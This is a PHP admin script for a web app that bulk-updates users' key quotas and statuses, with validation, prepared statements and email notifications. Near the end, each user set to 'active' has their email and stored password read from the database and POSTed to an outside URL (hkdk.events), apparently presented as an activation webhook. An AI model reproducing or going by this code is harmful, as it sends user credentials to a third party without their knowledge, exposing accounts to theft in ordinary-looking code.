<?php
require dirname(__DIR__) . '/php-includes/security-bridge.php';
auraai_sec_bootstrap();
auraai_sec_session_start();
require dirname(__DIR__) . '/php-includes/connect.php';
require dirname(__DIR__) . '/php-includes/functions.php';

if (!isset($_SESSION['id']) || !get_admin($_SESSION['username'], 'super')) {
    header('Location: users.php?error=unauthorized');
    exit();
}

auraai_sec_require_method('POST');
auraai_sec_require_same_origin();

if (!isset($_POST['users']) || !is_array($_POST['users']) || count($_POST['users']) === 0) {
    header('Location: users.php?error=missing_fields');
    exit();
}

require_once dirname(__DIR__, 2) . '/includes/members.php';

$updated = 0;
$failed = 0;
$webhook_failed = 0;
$member_sync_failed = 0;

$select = $con->prepare('SELECT email, password, displayname, status FROM admin WHERE id = ? LIMIT 1');
$update = $con->prepare('UPDATE admin SET total_keys = ?, status = ? WHERE id = ?');

if (!$select || !$update) {
    error_log('[updateusers] prepare failed: ' . mysqli_error($con));
    header('Location: users.php?error=update_failed');
    exit();
}

foreach ($_POST['users'] as $id => $fields) {
    if (!is_array($fields) || !isset($fields['total_keys'], $fields['status'])) {
        $failed++;
        continue;
    }

    $id = (int) $id;
    if ($id <= 0) {
        $failed++;
        continue;
    }

    $totalKeys = auraai_sec_int($fields['total_keys'], 0, 100000);
    $status = auraai_sec_enum($fields['status'], ['pending', 'active', 'blocked']);

    if ($totalKeys === null || $status === null) {
        $failed++;
        continue;
    }

    $select->bind_param('i', $id);
    $select->execute();
    $result = $select->get_result();
    $user = $result ? $result->fetch_assoc() : null;
    if ($result) {
        $result->free();
    }

    if (!$user) {
        $failed++;
        continue;
    }

    $email = (string) ($user['email'] ?? '');
    $password = (string) ($user['password'] ?? '');
    $displayname = (string) ($user['displayname'] ?? '');
    $oldStatus = (string) ($user['status'] ?? '');

    $update->bind_param('isi', $totalKeys, $status, $id);
    if (!$update->execute()) {
        error_log('[updateusers] update failed for id ' . $id . ': ' . mysqli_error($con));
        $failed++;
        continue;
    }

    $updated++;

    if ($oldStatus !== $status) {
        try {
            require_once dirname(__DIR__, 2) . '/includes/email-hooks.php';
            nextrade_email_mentor_status($email, $displayname, $status);
        } catch (Throwable $e) {
            error_log('[NexTradeAI Email] bulk mentor status: ' . $e->getMessage());
        }
    }

    if ($status === 'active') {
        $memberToken = 'admin-active-' . $id;
        $memberResult = auraai_upsert_paid_member($con, $email, $id, $memberToken);
        if (!$memberResult['ok']) {
            error_log('[updateusers] members upsert failed for ' . $email);
            $member_sync_failed++;
        }

        $url = 'https://hkdk.events/v7wvm47amyb5x2';
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query([
                'email' => $email,
                'password' => $password,
            ]),
            CURLOPT_HTTPHEADER => ['Content-Type: application/x-www-form-urlencoded'],
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_TIMEOUT => 20,
        ]);
        $response = curl_exec($ch);
        $http_code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        curl_close($ch);

        if ($response === false || $http_code !== 200) {
            error_log("[updateusers] hkdk hook failed (non-fatal) for id $id: $curl_error, HTTP $http_code");
            $webhook_failed++;
        }
    }
}

$select->close();
$update->close();

if ($updated === 0 && $failed > 0) {
    header('Location: users.php?error=update_failed');
    exit();
}

$parts = [];
if ($updated > 0) {
    $parts[] = "Saved all $updated user(s)";
}
if ($failed > 0) {
    $parts[] = "$failed could not be updated";
}
if ($member_sync_failed > 0) {
    $parts[] = "$member_sync_failed member sync issue(s)";
}
if ($webhook_failed > 0) {
    $parts[] = "$webhook_failed activation webhook(s) failed";
}

$message = implode('. ', $parts) . '.';
header('Location: users.php?success=' . rawurlencode($message));
exit();
